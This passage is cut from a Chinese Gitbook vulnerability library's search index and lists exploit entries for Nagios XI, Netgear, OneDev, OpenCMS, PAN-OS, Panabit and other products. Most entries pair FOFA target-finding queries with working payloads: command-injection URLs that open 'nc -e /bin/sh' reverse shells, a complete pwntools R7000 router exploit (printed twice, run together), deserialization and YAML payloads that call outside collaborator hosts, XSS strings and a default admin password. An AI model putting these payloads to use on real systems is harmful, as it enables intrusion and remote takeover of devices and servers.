+\"/nagiosxi/admin/monitoringplugins.php\", files=multipart_form_data, verify=False) if login(): print(\"[+] Login ... Success!\") execute_payload() from：https://www.exploit-db.com/exploits/49422 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/nagios-xi-5.7.5 多个漏洞（CVE-2021-25296~99）.html":{"url":"Edge_Security/nagios-xi-5.7.5 多个漏洞（CVE-2021-25296~99）.html","title":"nagios-xi-5.7.5 多个漏洞（CVE-2021-25296~99）","keywords":"","body":"nagios-xi-5.7.5 多个漏洞（CVE-2021-25296~99） FOFA: app=\"Nagios-XI\" CVE-2021-25296 PoC： https://10.0.2.15/nagiosxi/config/monitoringwizard.php?update=1&nsp=50c0f98fe9018dc43c81672ad1aeed5fd3f9710f013381519e553f846b5c2a86&nextstep=3&wizard=windowswmi&check_wmic_plus_ver=1.65&plugin_output_len=&ip_address=127.0.0.1&domain=127.0.0.1&username=asdf&password=asdf&auth_file=&plugin_output_len=1024; nc -e /bin/sh 127.0.0.1 4444;&submitButton2= plugin_output_len此处的变量未清除，可以给出command execution。例如：plugin_output_len=1024; nc -e /bin/sh 127.0.0.1 4444; CVE-2021-25297 代码位置：/usr/local/nagiosxi/html/includes/configwizards/switch/switch.inc.php POC（适用于管理员/非管理员身份验证） https://10.0.2.15/nagiosxi/config/monitoringwizard.php?update=1&nsp=4e4f78ca5c24c7c526dc86b23092b81c3231a7bf59e1eb67f9918b8daf7b6de9&nextstep=3&wizard=switch&ip_address=127.0.0.1;nc -e /bin/sh 127.0.0.1 4445;&port=161&snmpversion=2c&snmpopts%5Bsnmpcommunity%5D=public&snmpopts%5Bv3_security_level%5D=authPriv&snmpopts%5Bv3_username%5D=&snmpopts%5Bv3_auth_password%5D=&snmpopts%5Bv3_auth_proto%5D=MD5&snmpopts%5Bv3_priv_password%5D=&snmpopts%5Bv3_priv_proto%5D=DES&portnames=number&scaninterfaces=on&bulk_fields%5B%5D=ip_address&bulk_fields%5B%5D=&bulk_fields%5B%5D=&bulk_options=&bulk_fields%5B%5D=&bulk_fields%5B%5D=&warn_speed_in_percent=50&crit_speed_in_percent=80&warn_speed_out_percent=50&crit_speed_out_percent=80&default_port_speed=100&submitButton2= ip_address此处的变量未清除，可以给出command execution。例如：ip_address=1024; nc -e /bin/sh 127.0.0.1 4444; CVE-2021-25298 代码路径：/usr/local/nagiosxi/html/includes/configwizards/cloud-vm/cloud-vm.inc.php POC（适用于管理员/非管理员身份验证） https://10.0.2.15/nagiosxi/config/monitoringwizard.php?update=1&nsp=e2401df06a3892ba612df20e1ce2f559d7647c4b5fcba7f64c23c0ea9df1564f&nextstep=4&wizard=digitalocean&no_ssl_verify=1&ip_address=127.0.0.1;nc -e /bin/sh 127.0.0.1 4445;&port=5693&token=123&submitButton2= ip_address此处的变量未清除，可以给出command execution。例如：ip_address=1024; nc -e /bin/sh 127.0.0.1 4444; CVE-2021-25299 代码位置：/usr/local/nagiosxi/html/admin/sshterm.php PoC： https://10.0.2.15/nagiosxi/admin/sshterm.php?url=javascript:alert(1) from：https://github.com/fs0c-sh/nagios-xi-5.7.5-bugs Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Netgear JGS516PE-GS116Ev2 交换机中多个高危漏洞.html":{"url":"Edge_Security/Netgear JGS516PE-GS116Ev2 交换机中多个高危漏洞.html","title":"Netgear JGS516PE-GS116Ev2 交换机中多个高危漏洞","keywords":"","body":"Netgear JGS516PE/GS116Ev2 交换机中多个高危漏洞 FOFA: title=\"Netgear ProSAFE Plus Switch\" 1.未经身份验证的远程代码执行（CVE-2020-26919） 漏洞点位于login.html中的SubmitId参数，未对调试操作做限制导致用户执行系统命令。 curl -X POST --data-raw 'submitId=debug&debugCmd=sys+dump&submitEnd=' 'http:///login.htm' 4.存储型XSS（CVE-2020-35228） POST /index.htm HTTP/1.1 Host: 192.168.0.239 User-Agent: (...snip...) Accept: (...snip...) Accept-Language: (...snip...) Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 158 Origin: http://192.168.0.239 Connection: close Referer: http://192.168.0.239/index.htm?0 Cookie: (...snip...) Upgrade-Insecure-Requests: 1 submitId=multiLanguageCfg&selectLang=aaaa';alert(1);//&multiLangFlag=0&RegisterStatus=0&registeredPopUp=0&changePwdPopUp=0&changePwd=0&confirmPwd=0&submitEnd= 详情：https://research.nccgroup.com/2021/03/08/technical-advisory-multiple-vulnerabilities-in-netgear-prosafe-plus-jgs516pe-gs116ev2-switches/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/NETGEAR R7000 缓冲区溢出漏洞（CVE-2021-31802）.html":{"url":"Edge_Security/NETGEAR R7000 缓冲区溢出漏洞（CVE-2021-31802）.html","title":"NETGEAR R7000 缓冲区溢出漏洞（CVE-2021-31802）","keywords":"","body":"NETGEAR R7000 缓冲区溢出漏洞（CVE-2021-31802） 漏洞使邻近网络的攻击者可以在受影响的NETGEAR R7000路由器安装上执行任意代码。利用此漏洞不需要身份验证。 影响版本： 运行固件版本1.0.11.116及更低版本的Netgear Nighthawk R7000 详情分析：https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r7000-httpd-preauth-rce/ exploit.py: # coding: utf-8 from pwn import * import copy import sys def post_request(path, headers, files): r = remote(rhost, rport) request = 'POST %s HTTP/1.1' % path request += '\\r\\n' request += '\\r\\n'.join(headers) request += '\\r\\nContent-Type: multipart/form-data; boundary=f8ffdd78dbe065014ef28cc53e4808cb\\r\\n' post_data = '--f8ffdd78dbe065014ef28cc53e4808cb\\r\\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\\r\\n\\r\\n' % (files['name'], files['filename']) post_data += files['filecontent'] request += 'Content-Length: %i\\r\\n\\r\\n' % len(post_data) request += post_data r.send(request) sleep(0.5) r.close() def gen_request(path, headers, files): request = 'POST %s HTTP/1.1' % path request += '\\r\\n' request += '\\r\\n'.join(headers) request += '\\r\\nContent-Type: multipart/form-data; boundary=f8ffdd78dbe065014ef28cc53e4808cb\\r\\n' post_data = '--f8ffdd78dbe065014ef28cc53e4808cb\\r\\nContent-Dasposition: form-data; name=\"%s\"; filename=\"%s\"\\r\\n\\r\\n' % (files['name'], files['filename']) post_data += files['filecontent'] request += 'Content-Length: %i\\r\\n\\r\\n' % len(post_data) request += post_data return request def make_filename(chunk_size): return 'a' * (0x1d7 - chunk_size) def send_payload(file_name_len,files): total_payload = 'a'*(609 + 1024 * 58) path = '/cgi-bin/genie.cgi?backup.cgi\\nContent-Length: 4156559' headers = ['Host: %s:%s' % (rhost, rport), 'Content-Disposition: form-data','a'*0x200 + ': anynomous'] f = copy.deepcopy(files) f['filename'] = make_filename(file_name_len) valid_payload = gen_request(path, headers, f) vaild_len = len(valid_payload) total_len = 609 + 1024 * 58 blind_payload_len = total_len - vaild_len blind_payload = 'a' * blind_payload_len total_payload = blind_payload + valid_payload t1 = 0 t2 = 0 for i in range(0,58): t1 = int(i * 1024) t2 = int((i+1)*1024 ) chunk = total_payload[t1:t2] last_chunk = total_payload[t2:] # print(last_chunk) r = remote(rhost, rport) r.send(total_payload) sleep(0.5) r.close() def execute(): headers = ['Host: %s:%s' % (rhost, rport), 'a'*0x200 + ': anynomous'] files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} send_payload(0x18,files) files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} send_payload(0x20,files) files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} files['filecontent'] = 'a' * 0x18 + p32(0x3c0) + p32(0x28) send_payload(0x18,files) f = copy.deepcopy(files) f['name'] = 'StringFilepload' f['filename'] = 'a' * 0x100 f['filecontent'] = p32(0x3a0).ljust(0x10) + 'a'* 0x39c + p32(0x9) post_request('/genierestore.cgi', headers, f) files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} send_payload(0x18,files) f = copy.deepcopy(files) f['name'] = 'StringFilepload' f['filename'] = 'a' * 0x100 f['filecontent'] = p32(0x20).ljust(0x10) + 'a' post_request('/genierestore.cgi', headers, f) magic_size = 0x48 f = copy.deepcopy(files) f['name'] = 'StringFilepload' f['filename'] = 'a' * 0x100 f['filecontent'] = p32(magic_size).ljust(0x10) + 'a' post_request('/genierestore.cgi', headers, f) free_got_addr = 0x00120920 files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} files['filecontent'] = 'a' * 0x24 + p32(magic_size+ 8 + 1) + p32(free_got_addr - magic_size) send_payload(0x20,files) files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} send_payload(magic_size,files) system_addr_plt = 0x0000E804 command = 'utelnetd -l /bin/sh' f = copy.deepcopy(files) f['name'] = 'StringFilepload' f['filename'] = 'a' * 0x100 f['filecontent'] = p32(magic_size).ljust(0x10) + command.ljust(magic_size-8, '\\x00') + p32(system_addr_plt) post_request('/genierestore.cgi', headers, f) def send_request(): r = remote(rhost, rport) login_request='''\\ GET / HTTP/1.1\\r Host: %s\\r Cache-Control: max-age=0\\r Authorization: Basic MToxMjM0NTY3ODEyMzEyMw==\\r Upgrade-Insecure-Requests: 1\\r User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\\r Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\r Accept-Encoding: gzip, deflate\\r Accept-Language: en,zh-CN;q=0.9,zh;q=0.8\\r Cookie: XSRF_TOKEN=1222440606\\r Connection: close\\r \\r '''% rhost r.send(login_request) a = r.recv(0x1000) # print a r.close() return a if __name__ == '__main__': context.log_level = 'error' if (len(sys.argv) ' % sys.argv[0]) exit() rhost = sys.argv[1] rport = sys.argv[2] while True: ret = send_request() firstline = ret.split('\\n')[0] if firstline.find('200') != -1: break execute()# coding: utf-8 from pwn import * import copy import sys def post_request(path, headers, files): r = remote(rhost, rport) request = 'POST %s HTTP/1.1' % path request += '\\r\\n' request += '\\r\\n'.join(headers) request += '\\r\\nContent-Type: multipart/form-data; boundary=f8ffdd78dbe065014ef28cc53e4808cb\\r\\n' post_data = '--f8ffdd78dbe065014ef28cc53e4808cb\\r\\nContent-Disposition: form-data; name=\"%s\"; filename=\"%s\"\\r\\n\\r\\n' % (files['name'], files['filename']) post_data += files['filecontent'] request += 'Content-Length: %i\\r\\n\\r\\n' % len(post_data) request += post_data r.send(request) sleep(0.5) r.close() def gen_request(path, headers, files): request = 'POST %s HTTP/1.1' % path request += '\\r\\n' request += '\\r\\n'.join(headers) request += '\\r\\nContent-Type: multipart/form-data; boundary=f8ffdd78dbe065014ef28cc53e4808cb\\r\\n' post_data = '--f8ffdd78dbe065014ef28cc53e4808cb\\r\\nContent-Dasposition: form-data; name=\"%s\"; filename=\"%s\"\\r\\n\\r\\n' % (files['name'], files['filename']) post_data += files['filecontent'] request += 'Content-Length: %i\\r\\n\\r\\n' % len(post_data) request += post_data return request def make_filename(chunk_size): return 'a' * (0x1d7 - chunk_size) def send_payload(file_name_len,files): total_payload = 'a'*(609 + 1024 * 58) path = '/cgi-bin/genie.cgi?backup.cgi\\nContent-Length: 4156559' headers = ['Host: %s:%s' % (rhost, rport), 'Content-Disposition: form-data','a'*0x200 + ': anynomous'] f = copy.deepcopy(files) f['filename'] = make_filename(file_name_len) valid_payload = gen_request(path, headers, f) vaild_len = len(valid_payload) total_len = 609 + 1024 * 58 blind_payload_len = total_len - vaild_len blind_payload = 'a' * blind_payload_len total_payload = blind_payload + valid_payload t1 = 0 t2 = 0 for i in range(0,58): t1 = int(i * 1024) t2 = int((i+1)*1024 ) chunk = total_payload[t1:t2] last_chunk = total_payload[t2:] # print(last_chunk) r = remote(rhost, rport) r.send(total_payload) sleep(0.5) r.close() def execute(): headers = ['Host: %s:%s' % (rhost, rport), 'a'*0x200 + ': anynomous'] files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} send_payload(0x18,files) files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} send_payload(0x20,files) files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} files['filecontent'] = 'a' * 0x18 + p32(0x3c0) + p32(0x28) send_payload(0x18,files) f = copy.deepcopy(files) f['name'] = 'StringFilepload' f['filename'] = 'a' * 0x100 f['filecontent'] = p32(0x3a0).ljust(0x10) + 'a'* 0x39c + p32(0x9) post_request('/genierestore.cgi', headers, f) files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} send_payload(0x18,files) f = copy.deepcopy(files) f['name'] = 'StringFilepload' f['filename'] = 'a' * 0x100 f['filecontent'] = p32(0x20).ljust(0x10) + 'a' post_request('/genierestore.cgi', headers, f) magic_size = 0x48 f = copy.deepcopy(files) f['name'] = 'StringFilepload' f['filename'] = 'a' * 0x100 f['filecontent'] = p32(magic_size).ljust(0x10) + 'a' post_request('/genierestore.cgi', headers, f) free_got_addr = 0x00120920 files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} files['filecontent'] = 'a' * 0x24 + p32(magic_size+ 8 + 1) + p32(free_got_addr - magic_size) send_payload(0x20,files) files = {'name': 'mtenRestoreCfg', 'filecontent': 'a'} send_payload(magic_size,files) system_addr_plt = 0x0000E804 command = 'utelnetd -l /bin/sh' f = copy.deepcopy(files) f['name'] = 'StringFilepload' f['filename'] = 'a' * 0x100 f['filecontent'] = p32(magic_size).ljust(0x10) + command.ljust(magic_size-8, '\\x00') + p32(system_addr_plt) post_request('/genierestore.cgi', headers, f) def send_request(): r = remote(rhost, rport) login_request='''\\ GET / HTTP/1.1\\r Host: %s\\r Cache-Control: max-age=0\\r Authorization: Basic MToxMjM0NTY3ODEyMzEyMw==\\r Upgrade-Insecure-Requests: 1\\r User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36\\r Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\r Accept-Encoding: gzip, deflate\\r Accept-Language: en,zh-CN;q=0.9,zh;q=0.8\\r Cookie: XSRF_TOKEN=1222440606\\r Connection: close\\r \\r '''% rhost r.send(login_request) a = r.recv(0x1000) # print a r.close() return a if __name__ == '__main__': context.log_level = 'error' if (len(sys.argv) ' % sys.argv[0]) exit() rhost = sys.argv[1] rport = sys.argv[2] while True: ret = send_request() firstline = ret.split('\\n')[0] if firstline.find('200') != -1: break execute() print('router is exploited!!!') print('router is exploited!!!') Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Node.js命令注入漏洞（CVE-2021-21315）.html":{"url":"Edge_Security/Node.js命令注入漏洞（CVE-2021-21315）.html","title":"Node.js命令注入漏洞（CVE-2021-21315）","keywords":"","body":"Node.js命令注入漏洞（CVE-2021-21315） Node.js-systeminformation是用于获取各种系统信息的Node.JS模块，它包含多种轻量级功能，可以检索详细的硬件和系统相关信息。自发布至今，systeminformation软件包下载次数近3400万。2021年02月24日，npm团队发布安全公告，Node.js库中的systeminformation软件包中存在一个命令注入漏洞（CVE-2021-21315），其CVSSv3评分为7.8。攻击者可以通过在未经过滤的参数中注入Payload来执行系统命令。目前该漏洞已经在5.3.1版本中修复。 复现步骤： 1.Linux服务器环境上运行应用程序 2.向site.com/api/getServices?name=nginx 发送GET请求 3.发送 PoC：https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC yoursite.com/api/getServices?name=$(echo -e 'Sekurak' > pwn.txt) yoursite.com/api/getServices?name[]=$(echo -e 'Sekurak' > pwn.txt) ref： https://www.venustech.com.cn/new_type/aqtg/20210225/22407.html https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Nokia G-120W-F 路由器存储型XSS（CVE-2021-30003）.html":{"url":"Edge_Security/Nokia G-120W-F 路由器存储型XSS（CVE-2021-30003）.html","title":"Nokia G-120W-F 路由器存储型XSS（CVE-2021-30003）","keywords":"","body":"Nokia G-120W-F 路由器存储型XSS（CVE-2021-30003） 在诺基亚 G-120W-F 3FE46606AGAB91设备上发现了一个存储型XSS。 详情分析：https://research.0xdutra.com/posts/router-g120w-f/ poc： curl 'http://192.168.237.254/urlfilter.cgi?add' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://192.168.237.254' -H 'Connection: keep-alive' -H 'Referer: http://192.168.237.254/urlfilter.cgi' -H 'Cookie: lsid=YRTNSynGMeHSwqOx; lang=../../..; sid=KpJqGrBuvsTrduXP; admin=1' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'csrf_token=LnwHSQKbNXXlDciL&passwd_token_value=&url_address=alert(1)&port_num=8080' ref： https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30003 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/NPM VSCode扩展中的RCE（CVE-2021-26700）.html":{"url":"Edge_Security/NPM VSCode扩展中的RCE（CVE-2021-26700）.html","title":"NPM VSCode扩展中的RCE（CVE-2021-26700）","keywords":"","body":"NPM VSCode扩展中的RCE（CVE-2021-26700） VSCode扩展eg2.vscode-npm-script中的远程代码执行漏洞，查看.vscode/settings.json文件时，项目中的恶意Payload可能导致远程代码执行。 测试版本：0.3.13 攻击者发布存储库，例如附加的linux-poc 目标克隆存储库以读取VSCode中的源代码 目标视图 package.json payload.sh 被执行 PoC： https://github.com/jackadamson/CVE-2021-26700 Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/OneBlog开源博客管理系统 远程命令执行.html":{"url":"Edge_Security/OneBlog开源博客管理系统 远程命令执行.html","title":"OneBlog开源博客管理系统 远程命令执行","keywords":"","body":"OneBlog开源博客管理系统 远程命令执行 由于使用含有漏洞版本的Apache Shiro和默认的密钥，导致OneBlog存在远程命令执行漏洞。 shiro 默认密钥. https://forum.ywhack.com/thread-115449-1-6.html Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/OneDev 多个高危漏洞 （CVE-2021-21242~51）.html":{"url":"Edge_Security/OneDev 多个高危漏洞 （CVE-2021-21242~51）.html","title":"OneDev 多个高危漏洞 （CVE-2021-21242~51）","keywords":"","body":"OneDev 多个高危漏洞 （CVE-2021-21242~51） CVE-2021-21242 CVE-2021-21243 CVE-2021-21244 CVE-2021-21245 CVE-2021-21246 CVE-2021-21247 CVE-2021-21248 CVE-2021-21249 CVE-2021-21250 CVE-2021-21251 1.AttachmentUploadServet上的预授权不安全反序列化 PoC： 用于ysoserial使用URLDNS小工具生成探测有效负载。该小工具将发送一个DNS请求，我们可以对其进行拦截以证明反序列化攻击已成功。 curl -X POST http://localhost:6610/attachment_upload -H \"File-Name: foo\" -H \"Attachment-Support: `java -jar /Users/pwntester/Dev/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://536mvpzmverok48wr06msp5du40uoj.burpcollaborator.net | base64`\" 2.在KubernetesResource上进行预认证不安全反序列化 PoC： java -jar ~/Dev/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://pzs6r9v6ryn8go4gnk26o91xqowgk5.burpcollaborator.net > deser_payload.bin` curl -H \"Content-Type:application/octet-stream\" --data-binary @deser_payload.bin http://localhost:6610/rest/k8s/allocate-job-caches java -jar ~/Dev/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS http://pzs6r9v6ryn8go4gnk26o91xqowgk5.burpcollaborator.net > deser_payload.bin curl -H \"Content-Type:application/octet-stream\" --data-binary @deser_payload.bin http://localhost:6610/rest/k8s/report-job-caches 3.通过Bean验证消息篡改进行预身份验证SSTI PoC： ${'test'.toUpperCase()}` -> `%24%7b%27%74%65%73%74%27%2e%74%6f%55%70%70%65%72%43%61%73%65%28%29%7d curl -X GET -H \"Content-Type: application/json\" http://localhost:6610/rest/projects\\?%24%7b%27%74%65%73%74%27%2e%74%6f%55%70%70%65%72%43%61%73%65%28%29%7d=bar Caused by: org.glassfish.jersey.server.ContainerException: java.lang.NoSuchMethodError: javax.el.ELContext.notifyBeforeEvaluation(Ljava/lang/String;) curl -X GET -H \"Content-Type: application/json\" https://code.onedev.io/rest/projects\\?%24%7b%27%74%65%73%74%27%2e%74%6f%55%70%70%65%72%43%61%73%65%28%29%7d=bar Unexpected query params: [TEST] (path = ProjectResource.query., invalidValue = [null, null, null, org.glassfish.jersey.server.internal.routing.UriRoutingContext@5b27a361]) 4：验证前任意文件上传 String fileName = URLDecoder.decode(request.getHeader(\"File-Name\"), StandardCharsets.UTF_8.name()); ... String attachmentName = attachmentSuppport.saveAttachment(fileName, request.getInputStream()); 5：验证前访问令牌泄漏 PoC： curl -X GET -H \"Content-Type: application/json\" http://localhost:6610/rest/users Unauthorized access to user profiles curl -X GET -H \"Content-Type: application/json\" http://localhost:6610/rest/users/1 { \"id\" : 1, \"name\" : \"admin\", \"fullName\" : \"admin\", \"ssoInfo\" : { \"connector\" : null, \"subject\" : \"4a155bff-715d-45e9-8898-4152bb97d25e\" }, \"email\" : \"alvaro@pwntester.com\", \"accessToken\" : \"JqnqWs6YsP8x3poNpnj6J6GFbvh0szli6lr5BWH8\", \"userProjectQueries\" : [ ], \"userIssueQueries\" : [ ], \"userIssueQueryWatches\" : { }, \"issueQueryWatches\" : { }, \"userPullRequestQueries\" : [ ], \"userPullRequestQueryWatches\" : { }, \"pullRequestQueryWatches\" : { }, \"userBuildQueries\" : [ ], \"userBuildQuerySubscriptions\" : [ ], \"buildQuerySubscriptions\" : [ ] } 6：BasePage（AJAX）上的验证后不安全反序列化 PoC： POST /projects/my-app/blob?7-1.IBehaviorListener.0- HTTP/1.1 Host: localhost:6610 Content-Length: 389 Accept: application/xml, text/xml, */*; q=0.01 X-Requested-With: XMLHttpRequest Wicket-Ajax-BaseURL: projects/my-app/blob Wicket-Ajax: true User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://localhost:6610 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost:6610/projects/my-app/blob Accept-Encoding: gzip, deflate Accept-Language: en-GB,en-US;q=0.9,en;q=0.8 Cookie: JSESSIONID=node0cq7tdfxnza2v1nb58f7zwg7jj6.node0 Connection: close data=rO0ABXN9AAAAAQAaamF2YS5ybWkucmVnaXN0cnkuUmVnaXN0cnl4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcgAtamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdEludm9jYXRpb25IYW5kbGVyAAAAAAAAAAICAAB4cgAcamF2YS5ybWkuc2VydmVyLlJlbW90ZU9iamVjdNNhtJEMYTMeAwAAeHB3OAAKVW5pY2FzdFJlZgAPdG91Y2ggL3RtcC9mb29vAACFE//////C/CKmAAAAAAAAAAAAAAAAAAAAeA== 需身份验证。 7：通过Groovy脚本注入执行验证后任意代码 PoC： foo\") public String foo() {return \"\";}; static {Runtime.getRuntime().exec(\"touch /tmp/pwned1\");} // 8：验证后不安全Yaml反序列化 version: 1 jobs: - name: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://qgayzevwou8by0k3ochje4ebx23srh.burpcollaborator.net\"]]]] image: asdasd commands: - asd retrieveSource: true cloneCredential: !DefaultCredential {} cpuRequirement: 250m memoryRequirement: 128m retryCondition: never maxRetries: 3 retryDelay: 30 timeout: 3600 9：验证后外部实体扩展（XXE） PoC： ]> &file; 10：ZipSlip任意文件上传 import io.onedev.commons.utils.TarUtils; import java.io.FileInputStream; import java.io.File; public class UnTarTest { public static void main(String[] args) { try { FileInputStream is = new FileInputStream(new File(\"./zip-slip.tar\")); TarUtils.untar(is, new File(\"./dest\")); } catch (Exception e) { e.printStackTrace(); } } } from：https://securitylab.github.com/advisories/GHSL-2020-214_223-onedev Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/OpenCMS 11.0.2 文件上传到命令执行.html":{"url":"Edge_Security/OpenCMS 11.0.2 文件上传到命令执行.html","title":"OpenCMS 11.0.2 文件上传到命令执行","keywords":"","body":"OpenCMS 11.0.2 文件上传到命令执行 FOFA： app=\"OpenCms/\" 文件上传需要获取管理员的JSESSIONID或者账号密码。 SSRF Exploit.html： history.pushState('', '', '/') 重定向： GET /system/login?loginRedirect=https://google.com HTTP/1.1 Host: vulnerablehost.com Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: https://vulnerablehost.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://vulnerablehost.com/system/login Accept-Encoding: gzip, deflate Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: JSESSIONID=Valid JSESSIONID authenticated cookie 获取到管理员权限后进行上传文件。 详情可参考：https://dl.packetstormsecurity.net/2103-exploits/opencms1102-exec.pdf Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/OpenSSL 拒绝服务漏洞（CVE-2021-3449）.html":{"url":"Edge_Security/OpenSSL 拒绝服务漏洞（CVE-2021-3449）.html","title":"OpenSSL 拒绝服务漏洞（CVE-2021-3449）","keywords":"","body":"OpenSSL 拒绝服务漏洞（CVE-2021-3449） OpenSSL TLSv1.2 重新协商选项（默认开启）中存在一处空指针解引用，并导致拒绝服务。 影响版本： openssl:openssl PoC： Usage: go run . -host hostname:port // CVE-2021-3449 exploit code. if hello.vers >= VersionTLS12 { if c.handshakes == 0 { println(\"initial handshake\") hello.supportedSignatureAlgorithms = supportedSignatureAlgorithms } else { // OpenSSL pre-1.1.1k runs into a NULL-pointer dereference // if the supported_signature_algorithms extension is omitted, // but supported_signature_algorithms_cert is present. println(\"malicious handshake\") hello.supportedSignatureAlgorithmsCert = supportedSignatureAlgorithms } } ref： https://github.com/terorie/cve-2021-3449 https://www.openssl.org/news/secadv/20210325.txt Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Packer-Fuzzer 漏扫工具 < 1.2 远程代码执行漏洞.html":{"url":"Edge_Security/Packer-Fuzzer 漏扫工具 < 1.2 远程代码执行漏洞.html","title":"Packer-Fuzzer 漏扫工具 < 1.2 远程代码执行漏洞","keywords":"","body":"Packer-Fuzzer 漏扫工具 利用Packer-Fuzzer扫描加载恶意Payload的网站从远程加载恶意JS导致命令执行。 目前发布的1.2版本已经修复。 hack.js： document.createElement(\"script\"); q.p+\"\";eval(decodeURI(\"require(%27child_process%27).e%78ec(%27mate-calc%27)\"));//\"{114514:;[s].js index.html： naive! 详细分析见：https://drivertom.blogspot.com/2021/01/packer-fuzzerrce-0day.html PoC from：https://github.com/TomAPU/poc_and_exp/tree/master/Packer-Fuzzer-RCE Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Palo Alto PAN-OS 防火墙多个漏洞.html":{"url":"Edge_Security/Palo Alto PAN-OS 防火墙多个漏洞.html","title":"Palo Alto PAN-OS 防火墙多个漏洞","keywords":"","body":"Palo Alto PAN-OS 防火墙多个漏洞 任意命令执行 CVE-2020-2037和CVE-2020-2038 DOS — CVE-2020-2039 反射跨站点脚本（XSS）— CVE-2020-2036 RCE #1 登录web管理，在“Objects”选项卡上，转到“External Dynamic Lists”，点击新增源，输入Payload： http://myhost/?result='`id`' http://myServer/'`sleep 5`' RCE #2 DOS/XSS:https://swarm.ptsecurity.com/swarm-of-palo-alto-pan-os-vulnerabilities/ from:https://swarm.ptsecurity.com/swarm-of-palo-alto-pan-os-vulnerabilities/ Edge Security文库 all right reserved，powered by GitbookFile Modify: 2021-05-22 00:14:38 "},"Edge_Security/Panabit 智能应用网关 后台命令执行漏洞.html":{"url":"Edge_Security/Panabit 智能应用网关 后台命令执行漏洞.html","title":"Panabit 智能应用网关 后台命令执行漏洞","keywords":"","body":"Panabit 智能应用网关 后台命令执行漏洞 Panabit 智能应用网关 ajax_top 后台存在命令执行漏洞，攻击者可以以root权限运行部分危险命令. fofa：cert=\"panabit.com\" && body=\"/login/login.js\" 默认密码：admin/panabit poc： POST /cgi-bin/Maintain/ajax_top?action=runcmd&cmd=ls HTTP/1.1 Host: Connection: close Content-Length: 0 sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\" Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Cache-Control: no-cache Accept-Language: zh-CN,zh;q=0.8 sec-ch-ua-mobile: ?0 User-Agent: 